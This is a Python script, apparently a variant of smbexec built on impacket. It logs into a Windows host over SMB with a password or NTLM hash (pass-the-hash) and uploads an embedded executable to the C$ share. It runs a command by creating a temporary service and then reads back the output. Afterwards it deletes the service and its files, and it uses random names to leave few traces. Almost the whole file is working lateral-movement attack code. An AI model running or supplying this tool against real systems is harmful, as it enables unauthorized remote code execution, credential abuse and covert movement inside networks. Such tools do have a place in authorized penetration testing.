import ntpath, os, chardet, base64, gzip, sys, random, string
from impacket.dcerpc.v5 import transport, scmr
from impacket.smbconnection import SMBConnection
from io import BytesIO

def randomStr(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))

runName = randomStr(8) + '.exe'
resultName = randomStr(8) + '.txt'
serviceName = randomStr(8)
path = '\\'
share = "c$"
lolbinsData = gzip.decompress(base64.b64decode(b""))

def remote_exec(rpctransport, command):
    binaryPathName = f'C:\\{runName} -accepteula "cmd.exe" "/c {command} > C:\\{resultName}"'
    scmr1 = rpctransport.get_dce_rpc()
    scmr1.connect()
    scmr1.bind(scmr.MSRPC_UUID_SCMR)
    resp = scmr.hROpenSCManagerW(scmr1)
    scHandle = resp['lpScHandle']
    resp = scmr.hRCreateServiceW(scmr1, scHandle, serviceName, serviceName, lpBinaryPathName=binaryPathName, dwStartType=scmr.SERVICE_DEMAND_START)
    service = resp['lpServiceHandle']
    try:
        scmr.hRStartServiceW(scmr1, service)
    except:
        pass
    scmr.hRDeleteService(scmr1, service)
    scmr.hRCloseServiceHandle(scmr1, service)

def put_file(smbClient):
    fh = BytesIO(lolbinsData)
    finalpath = ntpath.join(path, os.path.basename(runName))
    finalpath = finalpath.replace('/', '\\')
    smbClient.putFile(share, finalpath, fh.read)

def get_file(smbClient):
    fh = BytesIO()
    finalpath = ntpath.join(path, os.path.basename(resultName))
    finalpath = finalpath.replace('/', '\\')
    smbClient.getFile(share, finalpath, fh.write)
    output = fh.getvalue()
    encoding = chardet.detect(output)["encoding"]
    fh.close()
    return output.decode(encoding)

def del_file(smbClient):
    for fileName in [runName, resultName]:
        finalpath = ntpath.join('\\', os.path.basename(fileName))
        finalpath = finalpath.replace('/', '\\')
        smbClient.deleteFile(share, finalpath)

def remote_init(username, password, target_ip):
    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % target_ip
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    smbClient = SMBConnection(target_ip, target_ip, sess_port=445)
    rpctransport.set_dport(445)
    rpctransport.setRemoteHost(target_ip)
    if len(password)>32:
        lmhash,nthash = password.split(":")
        rpctransport.set_credentials(username=username,password="", nthash=nthash,lmhash=lmhash)
        smbClient.login(user=username,password="",nthash=nthash,lmhash=lmhash)
    else:
        rpctransport.set_credentials(username=username, password=password)
        smbClient.login(user=username, password=password)
    smbClient.connectTree(share)
    return rpctransport, smbClient

def shell_execute(username, password, target_ip,command):
    rpc, smb = remote_init(username, password, target_ip)
    put_file(smb)
    remote_exec(rpc, command)
    output = get_file(smb)
    del_file(smb)
    print(output)
    
if __name__ == '__main__':
    if len(sys.argv) == 5:
        shell_execute(username=sys.argv[1],password=sys.argv[2],target_ip=sys.argv[3],command=sys.argv[4])
    else:
        print("help: smbexec.py <username> <password/lmhash:nthash> <target_ip> <command>")
